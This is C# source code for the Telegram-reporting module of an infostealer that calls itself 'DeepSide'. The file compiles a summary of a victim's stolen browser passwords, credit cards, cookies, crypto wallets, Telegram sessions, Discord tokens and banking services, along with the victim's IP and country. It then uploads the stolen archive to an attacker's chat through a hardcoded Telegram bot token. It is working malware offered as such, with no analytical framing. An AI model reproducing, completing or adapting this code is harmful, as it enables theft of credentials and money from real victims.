using System;
using System.IO;
using System.Threading.Tasks;
using spasibozapas;
using deepside;

using Telegram.Bot;

using Telegram.Bot.Types;

using Telegram.Bot.Types.InputFiles;
using System.Net.Http.Formatting;

namespace deepsidestubility
{
    class TelegramSender
    {
        private static TelegramBotClient bot;
        public static async Task SendFile(string archivename, string chatid)

        {
            string stealinfo = (""
                + "\n💎DeepSide with love-love"
                + "\n🏝Country: " + Flags.GetFlag(SystemInfo.culture.Split('-')[1]) + " " + SystemInfo.culture
                + "\n👤IP: " + SystemInfo.GetPublicIP()
                + "\n🌐Browsers: "
                + Counter.GetIValue("Passwords", Counter.Passwords)
                + Counter.GetIValue("CreditCards", Counter.CreditCards)
                + Counter.GetIValue("Cookies", Counter.Cookies)
                + Counter.GetIValue("AutoFill", Counter.AutoFill)
                + Counter.GetIValue("History", Counter.History)
                + Counter.GetIValue("Bookmarks", Counter.Bookmarks)
                + Counter.GetIValue("Downloads", Counter.Downloads)
                + "\n🖥Programs: "
                + Counter.GetIValue("Wallets", Counter.Wallets)
                + Counter.GetSValue("Telegram sessions", Counter.Telegram)
                + Counter.GetSValue("Discord token", Counter.Discord)
                + "\n"
                + Counter.GetLValue("💲Banking services: ", Counter.DetectedBankingServices, '+'));
            if (!string.IsNullOrWhiteSpace("5488771621:AAHVNLXbaXdhFNRzvZCTpxaQxkhjpENjix4") || System.IO.File.Exists(archivename))

            {

                bot = new TelegramBotClient("5488771621:AAHVNLXbaXdhFNRzvZCTpxaQxkhjpENjix4");

                using (FileStream stream = System.IO.File.OpenRead(archivename))

                {
                    string ssf = Path.GetFileName(archivename); // Получаем имя файла из потока
                    
                    var Iof = new InputOnlineFile(stream, ssf); // Входные данные для отправки
                    
                    string fromsend = $"Файл отправлен от: {Environment.UserName}"; // Имя пользователя
                    
                    Message ss = await bot.SendDocumentAsync(chatid, Iof, fromsend, caption: stealinfo); // Отправка файла с параметрами.
                    

                }

            }

        }
        public static async Task SendFile2(string archivename, string chatid)

        {
            
            if (!string.IsNullOrWhiteSpace("5488771621:AAHVNLXbaXdhFNRzvZCTpxaQxkhjpENjix4") || System.IO.File.Exists(archivename))

            {

                bot = new TelegramBotClient("5488771621:AAHVNLXbaXdhFNRzvZCTpxaQxkhjpENjix4");

                using (FileStream stream = System.IO.File.OpenRead(archivename))

                {

                    string ssf = Path.GetFileName(archivename); // Получаем имя файла из потока

                    var Iof = new InputOnlineFile(stream, ssf); // Входные данные для отправки

                    string fromsend = $"Файл отправлен от: {Environment.UserName}"; // Имя пользователя

                    Message ss = await bot.SendDocumentAsync(chatid, Iof, fromsend); // Отправка файла с параметрами.


                }

            }

        }
    }
}